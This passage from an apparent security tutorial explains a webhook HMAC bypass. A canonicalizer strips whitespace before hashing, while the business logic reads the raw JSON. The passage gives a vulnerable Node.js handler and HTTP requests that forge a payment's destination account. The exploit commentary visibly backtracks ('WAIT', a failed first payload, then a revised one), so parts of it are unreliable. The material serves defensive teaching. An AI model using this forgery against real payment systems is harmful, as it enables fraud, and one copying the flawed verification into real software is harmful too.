        let computedHash = crypto.createHmac('sha256', process.env.WEBHOOK_SECRET)
                                 .update(canonicalString)
                                 .digest('hex');

        if (computedHash !== expectedSignature) {
            return res.status(403).send("Integrity Check Failed");
        }

        // Business logic uses the raw, un-canonicalized req.body
        await PaymentProcessor.creditAccount(req.body.accountId, req.body.amount);
        res.send("Success");
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture enforces a zero-trust model, requiring internal microservices to independently cryptographically verify payloads originating from the API Gateway, \[2] The API Gateway acts as an active proxy, natively deserializing and re-serializing the JSON payloads as they pass through its middleware stack. This destroys the original byte-level structural formatting, \[3] To prevent persistent signature verification failures, developers downstream abandoned strict byte-for-byte hashing. They implemented custom canonicalization algorithms to aggressively normalize the payload (e.g., stripping all whitespace) before computing the HMAC, \[4] The execution sink. The architecture creates a devastating parser differential. The integrity checker verifies the aggressively stripped string, but the actual business logic parses the raw, un-stripped JSON structure. The attacker exploits this differential by designing a forged JSON payload that utilizes ignored characters (like spaces) to alter string parsing in the business logic, while ensuring the stripped, canonicalized string remains mathematically identical to a stolen, legitimate payload

```http
// 1. Attacker intercepts a legitimate, signed webhook intended for their own account.
// Payload: {"account":"ATTACKER_99","amount":50.00}
// X-Signature: "abc123validhmac"

// 2. The canonicalized string evaluated by the server is:
// {"account":"ATTACKER_99","amount":50.00}

// 3. Attacker modifies the payload by utilizing characters ignored by the integrity canonicalizer.
// They inject spaces into the key names and manipulate the JSON structure.

POST /api/v1/webhook/ingest HTTP/1.1
Host: api.enterprise.tld
X-Signature: abc123validhmac
Content-Type: application/json

{
  "acc ount":"ATTACKER_99",
  "am ount": 50.00,
  "account": "ATTACKER_99", 
  "amount": 99999.00
}

// 4. The downstream microservice receives the payload and applies the custom canonicalizer 
//    (removing all spaces).
// 5. The canonicalized string becomes:
// {"account":"ATTACKER_99","amount":50.00,"account":"ATTACKER_99","amount":99999.00}
//
// WAIT - to achieve a perfect collision, the attacker must match the EXACT original string length 
// and contents if they don't have the key.
// 
// Let's optimize the collision payload: The attacker wants to change the amount to 50000.
// If the canonicalizer strips spaces, the attacker submits:
// {"account":"ATTACKER_99","amount":50.00 , "account": "ATTACKER_99", "amount": 50000} 
// (This changes the base string).

// TRUE COLLISION MECHANISM:
// If the canonicalizer ONLY strips spaces, an attacker can't easily alter the values without 
// changing the base text. However, if the canonicalizer also ALPHABETIZES keys, or uses a 
// specific parsing order...

// REVISED COLLISION:
// The attacker intercepts: {"account":"123","amount":50}
// Signature: MAC_A
// Attacker wants to change account to "12 3" (a different account) but keep the signature.
// Attacker submits: {"account":"12 3","amount":50}
// Canonicalizer strips spaces: {"account":"123","amount":50} -> Computes to MAC_A! Matches!
// The JSON Parser reads "12 3" and credits Account "12 3".

POST /api/v1/webhook/ingest HTTP/1.1
Host: api.enterprise.tld
X-Signature: MAC_A
Content-Type: application/json

{"account":"12 3","amount":50}

// 6. The custom canonicalizer strips the space. The string becomes {"account":"123","amount":50}.
// 7. The HMAC evaluates perfectly.
// 8. The JSON parser parses the raw payload, extracting "12 3" as the account.
// 9. The attacker successfully forged the destination account of the webhook.
```
{% endstep %}

{% step %}
To enforce zero-trust cryptographic validation across a service mesh, engineers required downstream services to independently verify webhook HMAC signatures. Because the intermediary API Gateway modified the byte structure of the payload during transit, strict byte-for-byte signature verification consistently failed. Developers optimized this by deploying custom "lenient canonicalization" algorithms, stripping formatting characters (like whitespace) to generate a stable, hashable base string. The security failure emerged from the creation of a Parser Differential: the integrity checker validated a mutated, stripped string, while the core business logic executed against the raw, unmodified JSON payload. The attacker exploited this by injecting target modifications utilizing characters explicitly ignored by the canonicalizer. This yielded a perfect hash collision against a stolen, legitimate signature, completely bypassing the cryptographic perimeter and enabling silent, authenticated transaction forgery
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
